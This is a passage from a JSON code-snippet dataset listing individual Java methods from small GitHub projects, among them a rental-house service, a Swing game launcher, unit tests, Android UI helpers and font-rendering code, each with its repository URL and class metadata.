BusinessException(ApiResponseEnum.HOUSE_NOT_FOUND_ERROR));        HouseTag houseTag = houseTagRepository.findByNameAndHouseId(tagForm.getName(), tagForm.getHouseId())                .orElseThrow(() -> new BusinessException(ApiResponseEnum.TAG_NOT_EXIST));        houseTagRepository.delete(houseTag);    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/service/house/impl/HouseServiceImpl.java", "stars": "3", "class": {"name": "HouseServiceImpl", "extends": null, "implements": ["HouseService"], "modifiers": ["public"]}}, {"method_name": "deletePicture", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void deletePicture(Long pictureId) {        HousePicture housePicture = housePictureRepository.findById(pictureId).orElseThrow(() -> new BusinessException(ApiResponseEnum.PICTURE_NOT_EXIST));        try {            // TODO \u4e03\u725b\u4e91\u4e2d\u76f8\u540c\u56fe\u7247\u53ea\u5b58\u4e00\u4efd\uff0c\u5982\u679c\u5220\u9664\u7684\u8bdd\u4f1a\u5bfc\u81f4\u5176\u4ed6\u5f15\u7528\u6539\u56fe\u7247\u7684\u623f\u5c4b\u7167\u7247\u4e5f\u88ab\u5220\u9664            Response response = qiniuService.deleteFile(housePicture.getPath());            if(response.isOK()){                housePictureRepository.delete(housePicture);            }else{                log.error(\"\u5220\u9664\u4e03\u725b\u4e91\u56fe\u7247\u5931\u8d25:{}\", response.error);                throw new BusinessException(ApiResponseEnum.PICTURE_DELETE_FAIL);            }        } catch (QiniuException e) {            e.printStackTrace();            throw new BusinessException(ApiResponseEnum.PICTURE_DELETE_FAIL);        }    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/service/house/impl/HouseServiceImpl.java", "stars": "3", "class": {"name": "HouseServiceImpl", "extends": null, "implements": ["HouseService"], "modifiers": ["public"]}}, {"method_name": "updateCover", "params": ["Long", "Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateCover(Long coverId, Long houseId) {        HousePicture housePicture = housePictureRepository.findById(coverId).orElseThrow(() -> new BusinessException(ApiResponseEnum.PICTURE_NOT_EXIST));        House house = houseRepository.findById(houseId).orElseThrow(() -> new BusinessException(ApiResponseEnum.HOUSE_NOT_FOUND_ERROR));        houseRepository.updateCover(housePicture.getPath(), house.getId());    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/service/house/impl/HouseServiceImpl.java", "stars": "3", "class": {"name": "HouseServiceImpl", "extends": null, "implements": ["HouseService"], "modifiers": ["public"]}}, {"method_name": "generateHouseDetail", "params": ["HouseForm"], "throws": null, "modifiers": ["private"], "return_type": "HouseDetail", "snippet": "    private HouseDetail generateHouseDetail(HouseForm houseForm){        HouseDetail houseDetail = new HouseDetail();        if(houseForm.getSubwayLineId() != null && houseForm.getSubwayStationId() != null){            Subway subway = subwayRepository.findById(houseForm.getSubwayLineId()).orElseThrow(() -> new BusinessException(ApiResponseEnum.SUBWAY_LINE_ERROR));            SubwayStation subwayStation = subwayStationRepository.findById(houseForm.getSubwayStationId()).orElseThrow(() -> new BusinessException(ApiResponseEnum.SUBWAY_STATION_ERROR));            if(subway.getId() != subwayStation.getSubwayId()){                throw new BusinessException(ApiResponseEnum.SUBWAY_AND_STATION_MATCH_ERROR);            }            houseDetail.setSubwayLineId(subway.getId());            houseDetail.setSubwayLineName(subway.getName());            houseDetail.setSubwayStationId(subwayStation.getId());            houseDetail.setSubwayStationName(subwayStation.getName());        }        houseDetail.setAddress(houseForm.getAddress());        houseDetail.setDescription(houseForm.getDescription());        houseDetail.setLayoutDesc(houseForm.getLayoutDesc());        houseDetail.setRentWay(houseForm.getRentWay());        houseDetail.setTraffic(houseForm.getTraffic());        houseDetail.setRoundService(houseForm.getRoundService());        return houseDetail;    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/service/house/impl/HouseServiceImpl.java", "stars": "3", "class": {"name": "HouseServiceImpl", "extends": null, "implements": ["HouseService"], "modifiers": ["public"]}}, {"method_name": "generateHousePicture", "params": ["HouseForm", "Long"], "throws": null, "modifiers": ["private"], "return_type": "List<HousePicture>", "snippet": "    private List<HousePicture> generateHousePicture(HouseForm houseForm, Long houseId){        List<HousePicture> housePictures = new ArrayList<>();        if(CollectionUtils.isEmpty(houseForm.getPictures())){            return housePictures;        }        List<PictureForm> photos = houseForm.getPictures();        housePictures = photos.stream().map(item -> {            HousePicture housePicture = new HousePicture();            housePicture.setCdnPrefix(cdnPrefix);            housePicture.setHouseId(houseId);            housePicture.setPath(item.getPath());            housePicture.setHeight(item.getHeight());            housePicture.setWidth(item.getWidth());            return housePicture;        }).collect(Collectors.toList());        return housePictures;    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/service/house/impl/HouseServiceImpl.java", "stars": "3", "class": {"name": "HouseServiceImpl", "extends": null, "implements": ["HouseService"], "modifiers": ["public"]}}, {"method_name": "generateHouseTag", "params": ["HouseForm", "Long"], "throws": null, "modifiers": ["private"], "return_type": "List<HouseTag>", "snippet": "    private List<HouseTag> generateHouseTag(HouseForm houseForm, Long houseId){        if(CollectionUtils.isEmpty(houseForm.getTags())){            return Collections.emptyList();        }        List<HouseTag> houseTagList = houseForm.getTags().stream().map(tag -> {            HouseTag houseTag = new HouseTag();            houseTag.setName(tag);            houseTag.setHouseId(houseId);            return houseTag;        }).collect(Collectors.toList());        return houseTagList;    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/service/house/impl/HouseServiceImpl.java", "stars": "3", "class": {"name": "HouseServiceImpl", "extends": null, "implements": ["HouseService"], "modifiers": ["public"]}}, {"method_name": "init", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init(){         //Reds         JLabel reds_dis = new JLabel();         reds_dis.setBounds(70,40,200,40);         reds_dis.setBackground(Color.WHITE);         reds_dis.setForeground(Color.RED);         reds_dis.setText(\"Red enemies (the small ones)\");         front.add(reds_dis);         JTextField reds= new JTextField();         reds.setBounds(70,110,70,40);         reds.setBackground(Color.WHITE);         reds.setForeground(Color.RED);         front.add(reds);         //Blues         JLabel blues_dis = new JLabel();         blues_dis.setBounds(400,40,200,40);         blues_dis.setBackground(Color.WHITE);         blues_dis.setForeground(Color.BLUE);         blues_dis.setText(\"Blue enemies (the big ones)\");         front.add(blues_dis);         JTextField blues= new JTextField();         blues.setBounds(400,110,70,40);         blues.setBackground(Color.WHITE);         blues.setForeground(Color.BLUE);         front.add(blues);         //Hint        JLabel hint = new JLabel();        hint.setBackground(Color.WHITE);        hint.setForeground(Color.BLACK);        hint.setText(\"HINT!! : If you have no escape try to run fast through an object!\");        hint.setBounds(20, 600, 600, 40);        front.add(hint);        //Recomand        JTextField recomand = new JTextField();        recomand.setBounds(70, 170, 300, 40);        recomand.setBackground(Color.WHITE);        recomand.setForeground(Color.BLACK);        recomand.setEditable(false);        recomand.setText(\"Recommended: REDS: 8, Blues: 6\");        front.add(recomand);        //Name        JLabel name_dis = new JLabel();        name_dis.setBounds(75,230,200,40);        name_dis.setBackground(Color.WHITE);        name_dis.setForeground(Color.BLACK);        name_dis.setText(\"Enter your name:\");        front.add(name_dis);        JTextField name= new JTextField();        name.setBounds(70,280,250,40);        name.setBackground(Color.WHITE);        name.setForeground(Color.BLACK);        front.add(name);        //Play        JButton play = new JButton();        play.setBounds(400, 400, 200, 100);        play.setText(\"PLAY!\");        play.addActionListener(new ActionListener() {            @Override            public void actionPerformed(ActionEvent actionEvent) {                if (reds.getText().equals(\"\") || blues.getText().equals(\"\") || name.getText().equals(\"\")) {                    JOptionPane.showMessageDialog(front, \"Insert both number of enemies(Reds and Blues) and your name! \", \"Enter Both Numbers and your name\", JOptionPane.ERROR_MESSAGE);                    // Message box -> error -> forget to write a number (reds or blues) or name                    return;                } else {                    //Get the name,numbers of enemies and start the game                    FirstPage.nrreds = Integer.parseInt(reds.getText());                    FirstPage.nrblues = Integer.parseInt(blues.getText());                    MainWindow.playername=name.getText();                    //Minimum one enemy of each type                    if (nrreds == 0) nrreds++;                    if (nrblues == 0) nrblues++;                    //Hide first page                    dispose();                    new Thread(() -> {                        Character character = new Character();                        character.setSize(Utils.CHARACTER_SIZE, Utils.CHARACTER_SIZE);                        List<Enemy> enemies = new ArrayList<>();                        for (int i = 0; i < nrreds; i++) {                            Enemy enemy = new Enemy();                            enemy.setSize(Utils.CHARACTER_SIZE, Utils.CHARACTER_SIZE);                            enemies.add(enemy);                        }                        List<Enemy2> enemies2 = new ArrayList<>();                        for (int i = 0; i < nrblues; i++) {                            Enemy2 enemy2 = new Enemy2();                            enemy2.setSize(Utils.ENEMEY2_SIZE, Utils.ENEMEY2_SIZE);                            enemies2.add(enemy2);                        }                        // Start the game                        MainWindow application = new MainWindow(character, enemies, enemies2);                        application.setVisible(true);                        Controller control = new Controller(enemies, character, enemies2);                        control.start();                        Controller2 control2 = new Controller2(enemies2, character);                        control2.start();                        //Set timer                         MainWindow.start = System.currentTimeMillis();                    }).start();                }            }        });        front.add(play);    }", "url": "https://raw.githubusercontent.com/radudioane99/Shape-Storm/master/FirstPage.java", "stars": "2", "class": {"name": "FirstPage", "extends": "JFrame", "implements": null, "modifiers": ["public"]}}, {"method_name": "prepareVipTypeMessage", "params": ["String", "Player", "VipType"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String prepareVipTypeMessage(String message, Player player, VipType type) {        PrettyName prettyName = type.getPrettyName();        String prettyNameString = prettyName.isPresent() ? prettyName.getSection() : type.getIdentifier();        return message                .replace(\"{player}\", player.getName())                .replace(\"{name}\", type.getIdentifier())                .replace(\"{pretty_name}\", prettyNameString);    }", "url": "https://raw.githubusercontent.com/devwckd/wckd-vips/master/src/main/java/co/wckd/vips/util/Strings.java", "stars": "2", "class": {"name": "Strings", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getValue() {    return value;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/ancestor_ref/Reputation.java", "stars": "15", "class": {"name": "Reputation", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setValue", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setValue(int value) {    this.value = value;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/ancestor_ref/Reputation.java", "stars": "15", "class": {"name": "Reputation", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAuthor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Author", "snippet": "  public Author getAuthor() {    return author;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/ancestor_ref/Reputation.java", "stars": "15", "class": {"name": "Reputation", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setAuthor", "params": ["Author"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setAuthor(Author author) {    this.author = author;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/ancestor_ref/Reputation.java", "stars": "15", "class": {"name": "Reputation", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCode() {        return code;    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/data/ResponeModel.java", "stars": "2", "class": {"name": "ResponeModel", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCode", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCode(int code) {        this.code = code;    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/data/ResponeModel.java", "stars": "2", "class": {"name": "ResponeModel", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMessage() {        return message;    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/data/ResponeModel.java", "stars": "2", "class": {"name": "ResponeModel", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setMessage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMessage(String message) {        this.message = message;    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/data/ResponeModel.java", "stars": "2", "class": {"name": "ResponeModel", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isSuccess", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isSuccess() {        return success;    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/data/ResponeModel.java", "stars": "2", "class": {"name": "ResponeModel", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setSuccess", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSuccess(boolean success) {        this.success = success;    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/data/ResponeModel.java", "stars": "2", "class": {"name": "ResponeModel", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getObject", "params": [], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "    public T getObject() {        return object;    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/data/ResponeModel.java", "stars": "2", "class": {"name": "ResponeModel", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setObject", "params": ["T"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setObject(T object) {        this.object = object;    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/data/ResponeModel.java", "stars": "2", "class": {"name": "ResponeModel", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "should_set_DstOffset_NotCountry", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void should_set_DstOffset_NotCountry(){         //given        IssData issData = new IssData();        String EX_TERYTORY = \"tereny Eksterytorialne\";        //when        issData.setCountryName(EX_TERYTORY);        issData.setLon(\"-50\");        issData.setDstOffset(0L);        Long result = issData.getDstOffset();        //then        assertEquals(result, -3L);    }", "url": "https://raw.githubusercontent.com/wojciechgalach/PositionInternationalSpaceStation/master/src/test/java/pl/com/nur/internationalspacestation/internationalspacestation/service/IssDataTest.java", "stars": "1", "class": {"name": "IssDataTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "should_set_DstOffset_NotCountry_NotEquals", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void should_set_DstOffset_NotCountry_NotEquals(){        //given        IssData issData = new IssData();        String EX_TERYTORY = \"tereny Eksterytorialne\";        //when        issData.setCountryName(EX_TERYTORY);        issData.setLon(\"-61\");        issData.setDstOffset(0L);        Long result = issData.getDstOffset();        //then        assertNotEquals(result, -3L);    }", "url": "https://raw.githubusercontent.com/wojciechgalach/PositionInternationalSpaceStation/master/src/test/java/pl/com/nur/internationalspacestation/internationalspacestation/service/IssDataTest.java", "stars": "1", "class": {"name": "IssDataTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "should_set_DstOffset_Country", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void should_set_DstOffset_Country(){        //given        IssData issData = new IssData();        //when        issData.setCountryName(\"Polish\");        issData.setDstOffset(2L);        Long result = issData.getDstOffset();        //then        assertEquals(result, 2L);    }", "url": "https://raw.githubusercontent.com/wojciechgalach/PositionInternationalSpaceStation/master/src/test/java/pl/com/nur/internationalspacestation/internationalspacestation/service/IssDataTest.java", "stars": "1", "class": {"name": "IssDataTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "should_set_DstOffset_Country_NotEquals", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void should_set_DstOffset_Country_NotEquals(){        //given        IssData issData = new IssData();        //when        issData.setCountryName(\"Polish\");        issData.setDstOffset(2L);        Long result = issData.getDstOffset();        //then        assertNotEquals(result, -2L);    }", "url": "https://raw.githubusercontent.com/wojciechgalach/PositionInternationalSpaceStation/master/src/test/java/pl/com/nur/internationalspacestation/internationalspacestation/service/IssDataTest.java", "stars": "1", "class": {"name": "IssDataTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.diary_reading_page);    }", "url": "https://raw.githubusercontent.com/RotonNorrison/StirDiary/master/app/src/main/java/com/example/stirdiary/DiaryReading.java", "stars": "2", "class": {"name": "DiaryReading", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onDraw", "params": ["Canvas", "RecyclerView", "RecyclerView"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDraw(Canvas c, RecyclerView parent, RecyclerView.State state) {        super.onDraw(c, parent, state);        final int left = parent.getPaddingLeft();        final int right = parent.getWidth() - parent.getPaddingRight();        //only draw the divider at the specified position        final View child = parent.getChildAt(mPosition);        if (null == child) return;        final RecyclerView.LayoutParams params = (RecyclerView.LayoutParams) child.getLayoutParams();        final int top = child.getBottom() + params.bottomMargin;        final int bottom = top + mDivider.getIntrinsicHeight();        mDivider.setBounds(left, top, right, bottom);        mDivider.draw(c);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/adapters/decorators/OneShotDividerDecorator.java", "stars": "4", "class": {"name": "OneShotDividerDecorator", "extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"method_name": "getItemOffsets", "params": ["Rect", "View", "RecyclerView", "RecyclerView"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getItemOffsets(Rect outRect, View view, RecyclerView parent, RecyclerView.State state) {        super.getItemOffsets(outRect, view, parent, state);        if (parent.getChildPosition(view) == mPosition)            outRect.set(0, 0, 0, mDivider.getIntrinsicHeight());    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/adapters/decorators/OneShotDividerDecorator.java", "stars": "4", "class": {"name": "OneShotDividerDecorator", "extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"method_name": "hasLimit", "params": ["Material"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasLimit(Material blockType) {        return getBlocks().containsKey(blockType);    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slimits/limits/BlockPlacementLimitConfig.java", "stars": "3", "class": {"name": "BlockPlacementLimitConfig", "extends": "BukkitYamlConfiguration", "implements": null, "modifiers": ["public"]}}, {"method_name": "setupTexture", "params": ["Font", "boolean", "boolean", "CharData"], "throws": null, "modifiers": ["protected"], "return_type": "DynamicTexture", "snippet": "    protected DynamicTexture setupTexture(Font font, boolean antiAlias, boolean fractionalMetrics, CharData[] chars) {        BufferedImage img = generateFontImage(font, antiAlias, fractionalMetrics, chars);        try {            return new DynamicTexture(img);        } catch (Exception e) {            e.printStackTrace();        }        return null;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/util/font/CFont.java", "stars": "12", "class": {"name": "CFont", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "generateFontImage", "params": ["Font", "boolean", "boolean", "CharData"], "throws": null, "modifiers": ["protected"], "return_type": "BufferedImage", "snippet": "    protected BufferedImage generateFontImage(Font font, boolean antiAlias, boolean fractionalMetrics, CharData[] chars) {        int imgSize = (int) this.imgSize;        BufferedImage bufferedImage = new BufferedImage(imgSize, imgSize, BufferedImage.TYPE_INT_ARGB);        Graphics2D g = (Graphics2D) bufferedImage.getGraphics();        g.setFont(font);        g.setColor(new Color(255, 255, 255, 0));        g.fillRect(0, 0, imgSize, imgSize);        g.setColor(Color.WHITE);        g.setRenderingHint(RenderingHints.KEY_FRACTIONALMETRICS, fractionalMetrics ? RenderingHints.VALUE_FRACTIONALMETRICS_ON : RenderingHints.VALUE_FRACTIONALMETRICS_OFF);        g.setRenderingHint(RenderingHints.KEY_TEXT_ANTIALIASING, antiAlias ? RenderingHints.VALUE_TEXT_ANTIALIAS_ON : RenderingHints.VALUE_TEXT_ANTIALIAS_OFF);        g.setRenderingHint(RenderingHints.KEY_ANTIALIASING, antiAlias ? RenderingHints.VALUE_ANTIALIAS_ON : RenderingHints.VALUE_ANTIALIAS_OFF);        FontMetrics fontMetrics = g.getFontMetrics();        int charHeight = 0;        int positionX = 0;        int positionY = 1;        for (int i = 0; i < chars.length; i++) {            char ch = (char) i;            CharData charData = new CharData();            Rectangle2D dimensions = fontMetrics.getStringBounds(String.valueOf(ch), g);            charData.width = (dimensions.getBounds().width + 8);            charData.height = dimensions.getBounds().height;            if (positionX + charData.width >= imgSize) {                positionX = 0;                positionY += charHeight;                charHeight = 0;            }            if (charData.height > charHeight) {                charHeight = charData.height;            }            charData.storedX = positionX;            charData.storedY = positionY;            if (charData.height > this.fontHeight) {                this.fontHeight = charData.height;            }            chars[i] = charData;            g.drawString(String.valueOf(ch), positionX + 2, positionY + fontMetrics.getAscent());            positionX += charData.width;        }        return bufferedImage;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/util/font/CFont.java", "stars": "12", "class": {"name": "CFont", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "drawChar", "params": ["CharData", "char", "float", "float"], "throws": ["ArrayIndexOutOfBoundsException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void drawChar(CharData[] chars, char c, float x, float y) throws ArrayIndexOutOfBoundsException {        try {            drawQuad(x, y, chars[c].width, chars[c].height, chars[c].storedX, chars[c].storedY, chars[c].width, chars[c].height);        } catch (Exception e) {            e.printStackTrace();        }    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/util/font/CFont.java", "stars": "12", "class": {"name": "CFont", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "drawQuad", "params": ["float", "float", "float", "float", "float", "float", "float", "float"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void drawQuad(float x, float y, float width, float height, float srcX, float srcY, float srcWidth, float srcHeight) {        float renderSRCX = srcX / imgSize;        float renderSRCY = srcY / imgSize;        float renderSRCWidth = srcWidth / imgSize;        float renderSRCHeight = srcHeight / imgSize;        GL11.glTexCoord2f(renderSRCX + renderSRCWidth, renderSRCY);        GL11.glVertex2d(x + width, y);        GL11.glTexCoord2f(renderSRCX, renderSRCY);        GL11.glVertex2d(x, y);        GL11.glTexCoord2f(renderSRCX, renderSRCY + renderSRCHeight);        GL11.glVertex2d(x, y + height);        GL11.glTexCoord2f(renderSRCX, renderSRCY + renderSRCHeight);        GL11.glVertex2d(x, y + height);        GL11.glTexCoord2f(renderSRCX + renderSRCWidth, renderSRCY + renderSRCHeight);        GL11.glVertex2d(x + width, y + height);        GL11.glTexCoord2f(renderSRCX + renderSRCWidth, renderSRCY);        GL11.glVertex2d(x + width, y);    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/util/font/CFont.java", "stars": "12", "class": {"name": "CFont", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getStringHeight", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getStringHeight(String text) {        return getHeight();    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/util/font/CFont.java", "stars": "12", "class": {"name": "CFont", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getHeight", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getHeight() {        return (this.fontHeight - 8) / 2;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/util/font/CFont.java", "stars": "12", "class": {"name": "CFont", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getStringWidth", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getStringWidth(String text) {        int width = 0;        for (char c : text.toCharArray()) {            if ((c < this.charData.length) && (c >= 0)) width += this.charData[c].width - 8 + this.charOffset;        }        return width / 2;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/util/font/CFont.java", "stars": "12", "class": {"name": "CFont", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isAntiAlias", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isAntiAlias() {        return this.antiAlias;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/util/font/CFont.java", "stars": "12", "class": {"name": "CFont", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setAntiAlias", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAntiAlias(boolean antiAlias) {        if (this.antiAlias != antiAlias) {            this.antiAlias = antiAlias;            tex = setupTexture(this.font, antiAlias, this.fractionalMetrics, this.charData);        }    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/util/font/CFont.java", "stars": "12", "class": {"name": "CFont", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isFractionalMetrics", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isFractionalMetrics() {        return this.fractionalMetrics;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/util/font/CFont.java", "stars": "12", "class": {"name": "CFont", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setFractionalMetrics", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFractionalMetrics(boolean fractionalMetrics) {        if (this.fractionalMetrics != fractionalMetrics) {            this.fractionalMetrics = fractionalMetrics;            tex = setupTexture(this.font, this.antiAlias, fractionalMetrics, this.charData);        }    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/util/font/CFont.java", "stars": "12", "class": {"name": "CFont", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getFont", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Font", "snippet": "    public Font getFont() {        return this.font;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/util/font/CFont.java", "stars": "12", "class": {"name": "CFont", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setFont", "params": ["Font"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFont(Font font) {        this.font = font;        tex = setupTexture(font, this.antiAlias, this.fractionalMetrics, this.charData);    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/util/font/CFont.java", "stars": "12", "class": {"name": "CFont", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setListener", "params": ["OnSelectMenuItem"], "throws": null, "modifiers": ["public"], "return_type": "MenuViewer", "snippet": "    public MenuViewer setListener(OnSelectMenuItem onSelectMenuItem) {        this.onSelectMenuItem = onSelectMenuItem;        return this;    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/bottomdialog/src/main/java/net/neonteam/appbottomdialog/widgets/MenuViewer.java", "stars": "4", "class": {"name": "MenuViewer", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setMenu", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "MenuViewer", "snippet": "    public MenuViewer setMenu (@MenuRes int res) {        activity.getMenuInflater().inflate(res, this.menu);        return this;    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/bottomdialog/src/main/java/net/neonteam/appbottomdialog/widgets/MenuViewer.java", "stars": "4", "class": {"name": "MenuViewer", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "build", "params": [], "throws": null, "modifiers": ["public"], "return_type": "AppBottomDialog", "snippet": "    public AppBottomDialog.Builder build () {        recyclerView = new RecyclerView(activity);        recyclerView.setLayoutManager(new LinearLayoutManager(activity));        recyclerView.setAdapter(new MenuViewerAdapter(activity.getApplicationContext(), menu, theme, settings, appBottomDialog,onSelectMenuItem));        appBottomDialog.setContentView(recyclerView);        return appBottomDialog;    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/bottomdialog/src/main/java/net/neonteam/appbottomdialog/widgets/MenuViewer.java", "stars": "4", "class": {"name": "MenuViewer", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "get", "params": [], "throws": null, "modifiers": ["public"], "return_type": "RecyclerView", "snippet": "    public RecyclerView get () {        return recyclerView;    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/bottomdialog/src/main/java/net/neonteam/appbottomdialog/widgets/MenuViewer.java", "stars": "4", "class": {"name": "MenuViewer", "extends": null, "implements": null, "modifiers": 